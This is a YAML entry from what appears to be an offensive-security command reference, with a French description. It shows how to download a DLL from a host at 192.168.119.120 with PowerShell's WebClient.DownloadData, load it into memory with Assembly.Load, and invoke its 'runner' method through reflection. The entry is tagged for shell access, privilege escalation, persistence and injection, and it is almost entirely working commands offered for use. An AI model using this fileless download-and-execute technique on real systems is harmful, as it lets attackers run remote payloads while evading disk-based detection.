---
description: |
  Utilisez la méthode DownloadData de la classe Net.WebClient pour télécharger la DLL sous la forme d'un tableau d'octets, puis utilisez la fonction Load pour charger le tableau d'octets dans la mémoire plutôt que sur le disque. Une fois l'assemblage chargé, nous pouvons interagir avec lui en utilisant la réflexion via les méthodes GetType et GetMethod, et enfin l'appeler via la méthode Invoke.

  Command Reference:

    DLL: ClassLibrary1.dll

    Byte array with code: $data

command: |
  $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')

code: |
  $assem = [System.Reflection.Assembly]::Load($data)
  or (for local file)   
  $assem = [System.Reflection.Assembly]::LoadFile("C:\user\documents\ClassLibrary1.dll") 
  $class = $assem.GetType("ClassLibrary1.Class1") 
  $method = $class.GetMethod("runner") 
  $method.Invoke(0, $null)

items:
  - Shell
services:
  - 
OS:
  - Windows
  - Approved-tool
attack_types:
  - PrivEsc
  - Persistence
  - Injection
references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-7.0
---